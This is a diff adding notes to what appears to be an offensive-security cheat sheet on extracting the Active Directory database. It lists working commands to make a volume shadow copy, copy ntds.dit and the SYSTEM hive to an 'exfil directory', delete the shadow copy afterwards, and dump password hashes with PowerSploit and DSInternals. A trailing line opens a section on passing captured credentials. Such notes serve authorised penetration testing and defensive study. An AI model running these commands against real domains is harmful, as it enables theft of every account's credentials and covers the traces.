@@ -1,3 +1,32 @@
+Extract ntds.dit 
+	Using VSSAdmin
+		Create a Volume Shadow Copy
+			vssadmin create shadow /for=C:
+				make note of the shadow copy volume name and shadow copy ID
+
+		Retrieve Ntds.dit file from Volume Shadow Copy
+			copy <shadow_copy_volume_name>\windows\ntds\ntds.dit <exfil directory>
+
+		Copy SYSTEM file from registry or Volume Shadow Copy. 
+			contains Boot Key needed to decrypt Ntds.dit
+
+			reg SAVE HKLM\SYSTEM <exfil directory>
+
+			copy <shadow_copy_volume_name>\windows\system32\config\SYSTEM <exfil directory>
+
+		Delete the volume shadow copy that was created
+			vssadmin delete shadows /shadow=<shadow_copy_ID>
+
+	Using PowerSploit Ninjacopy
+		invoke-ninjacopy -path c:\Windows\NTDS\ntds.dit -verbose -localdestination <exfil directory>
+
+
+Extracting password hashes from NTDS
+	Using DSInternals 
+		Get-ADDBAccount -all -dbpath '<exfil directory>' -bootkey $key
+
+
+
 **Using a captured set of credentials**
 
 Pass the Password
